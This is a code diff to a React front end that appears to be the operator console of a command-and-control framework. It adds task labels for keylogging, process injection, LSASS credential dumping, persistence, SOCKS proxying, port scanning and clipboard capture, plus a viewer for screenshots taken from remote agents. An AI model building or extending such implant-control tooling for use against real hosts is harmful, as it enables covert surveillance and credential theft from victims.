@@ -48,12 +48,23 @@ export function Agents() {
       if (script.includes("Get-Process") || script === "ps aux") return "ps";
       return script;
     }
-    if (task.task.command === "__nagomio_file_list") return `ls ${task.task.arguments[0] || "."}`;
-    if (task.task.command === "__nagomio_file_download") return `download ${task.task.arguments[0] || ""}`;
-    if (task.task.command === "__nagomio_file_upload") return `upload ${task.task.arguments[0] || ""}`;
-    if (task.task.command === "__nagomio_file_delete") return `rm ${task.task.arguments[0] || ""}`;
-    if (task.task.command === "__nagomio_file_rename") return `mv ${task.task.arguments[0] || ""} ${task.task.arguments[1] || ""}`;
-    if (task.task.command === "__nagomio_file_mkdir") return `mkdir ${task.task.arguments[0] || ""}`;
+    if (task.task.command === "file_list") return `ls ${task.task.arguments[0] || "."}`;
+    if (task.task.command === "file_download") return `download ${task.task.arguments[0] || ""}`;
+    if (task.task.command === "file_upload") return `upload ${task.task.arguments[0] || ""}`;
+    if (task.task.command === "file_delete") return `rm ${task.task.arguments[0] || ""}`;
+    if (task.task.command === "file_rename") return `mv ${task.task.arguments[0] || ""} ${task.task.arguments[1] || ""}`;
+    if (task.task.command === "file_mkdir") return `mkdir ${task.task.arguments[0] || ""}`;
+    if (task.task.command === "whoami") return "whoami";
+    if (task.task.command === "mem_exec") return `mem_exec ${(task.task.arguments[0] || "").slice(0, 24)}…`;
+    if (task.task.command === "portscan") return `portscan ${task.task.arguments[0] || ""} ${task.task.arguments[1] || ""}`;
+    if (task.task.command === "persist") return `persist ${(task.task.arguments[0] || "").slice(0, 24)}`;
+    if (task.task.command === "uninstall") return `uninstall ${task.task.arguments[0] || ""}`;
+    if (task.task.command === "socks") return `socks ${(task.task.arguments[0] || "").slice(0, 24)}`;
+    if (task.task.command === "screenshot") return "screenshot";
+    if (task.task.command === "clipboard") return "clipboard";
+    if (task.task.command === "keylog") return `keylog ${task.task.arguments[0] || ""}`;
+    if (task.task.command === "inject") return `inject ${task.task.arguments[0] || ""} ${(task.task.arguments[1] || "").slice(0, 24)}…`;
+    if (task.task.command === "lsass") return "lsass";
     return [task.task.command, ...task.task.arguments].join(" ");
   }
   const eventItems = [
@@ -179,7 +190,7 @@ export function Agents() {
     for (let index = 0; index < bytes.length; index += chunkSize) {
       binary += String.fromCharCode(...bytes.slice(index, index + chunkSize));
     }
-    await queueAgentTask("__nagomio_file_upload", [pendingUploadPath, window.btoa(binary)], `upload ${file.name}`);
+    await queueAgentTask("file_upload", [pendingUploadPath, window.btoa(binary)], `upload ${file.name}`);
     setPendingUploadPath("");
   }
 
@@ -197,6 +208,9 @@ export function Agents() {
 
     try {
       const parsed = JSON.parse(response.output);
+      if (parsed.type === "screenshot_bmp") {
+        return `Screenshot ${parsed.width}×${parsed.height} (${parsed.size} bytes)\nSaved to ${parsed.saved_path}`;
+      }
       if (parsed.type === "file_download") {
         return `Downloaded ${parsed.remote_path}\nSaved to ${parsed.saved_path}\nSize: ${parsed.size} bytes`;
       }
@@ -224,6 +238,16 @@ export function Agents() {
       return JSON.stringify(parsed, null, 2);
     } catch {
       return response.output;
+    }
+  }
+
+  function parsedOutput(task: TaskRecord): unknown | null {
+    const response = responseFor(task.task.task_id);
+    if (!response) return null;
+    try {
+      return JSON.parse(response.output);
+    } catch {
+      return null;
     }
   }
 
@@ -345,7 +369,11 @@ export function Agents() {
                     <span>{activeAgent?.registration.hostname ?? (selectedAgent || "agent")} &gt;</span>
                     <strong>{commandText(row.task)}</strong>
                   </div>
-                  <pre>{outputText(row.task)}</pre>
+                  <TaskOutputView
+                    task={row.task}
+                    parsed={parsedOutput(row.task) as ParsedResponse | null}
+                    fallback={outputText(row.task)}
+                  />
                 </div>
               ))}
               {consoleRows.length === 0 ? <div className="empty-state">Send a command to start a session log.</div> : null}
@@ -378,4 +406,93 @@ export function Agents() {
       </section>
     </div>
   );
+}
+
+type ParsedResponse = {
+  type?: string;
+  width?: number;
+  height?: number;
+  size?: number;
+  saved_path?: string;
+  filename?: string;
+  path?: string;
+  remote_path?: string;
+  source?: string;
+  destination?: string;
+  removed?: number;
+  [key: string]: unknown;
+};
+
+function TaskOutputView({ task, parsed, fallback }: { task: TaskRecord; parsed: ParsedResponse | null; fallback: string }) {
+  const { apiBlob } = useAppState();
+  const [imageUrl, setImageUrl] = useState<string | null>(null);
+  const [imageError, setImageError] = useState<string | null>(null);
+
+  const isScreenshot = parsed?.type === "screenshot_bmp" && typeof parsed.saved_path === "string";
+  const artifactKey = useMemo(() => {
+    if (!isScreenshot) return null;
+    const saved = String(parsed!.saved_path);
+    const segments = saved.split(/[\\/]/).filter(Boolean);
+    const filename = segments.pop() || "screenshot.bmp";
+    const taskId = segments.pop() || task.task.task_id;
+    const agentId = segments.pop() || task.agent_id;
+    return `/api/artifacts/${encodeURIComponent(agentId)}/${encodeURIComponent(taskId)}/${encodeURIComponent(filename)}`;
+  }, [isScreenshot, parsed, task.task.task_id, task.agent_id]);
+
+  useEffect(() => {
+    if (!artifactKey) {
+      setImageUrl((prev) => {
+        if (prev) URL.revokeObjectURL(prev);
+        return null;
+      });
+      setImageError(null);
+      return;
+    }
+    let cancelled = false;
+    setImageError(null);
+    apiBlob(artifactKey)
+      .then((blob) => {
+        if (cancelled) return;
+        setImageUrl((prev) => {
+          if (prev) URL.revokeObjectURL(prev);
+          return URL.createObjectURL(blob);
+        });
+      })
+      .catch((err: Error) => {
+        if (cancelled) return;
+        setImageError(err.message || "failed to load screenshot");
+      });
+    return () => {
+      cancelled = true;
+    };
+  }, [artifactKey, apiBlob]);
+
+  useEffect(() => {
+    return () => {
+      setImageUrl((prev) => {
+        if (prev) URL.revokeObjectURL(prev);
+        return null;
+      });
+    };
+  }, []);
+
+  if (isScreenshot) {
+    return (
+      <div className="task-output-screenshot">
+        <div className="task-output-screenshot-meta">
+          {parsed!.width}×{parsed!.height} · {parsed!.size} bytes · saved to <code>{String(parsed!.saved_path)}</code>
+        </div>
+        {imageError ? <div className="task-output-error">{imageError}</div> : null}
+        {imageUrl ? (
+          <a href={imageUrl} download={`screenshot-${task.task.task_id}.bmp`} target="_blank" rel="noreferrer">
+            <img className="task-output-image" src={imageUrl} alt={`screenshot from ${task.agent_id}`} />
+          </a>
+        ) : imageError ? null : (
+          <div className="task-output-loading">loading screenshot…</div>
+        )}
+      </div>
+    );
+  }
+
+  return <pre>{fallback}</pre>;
 }
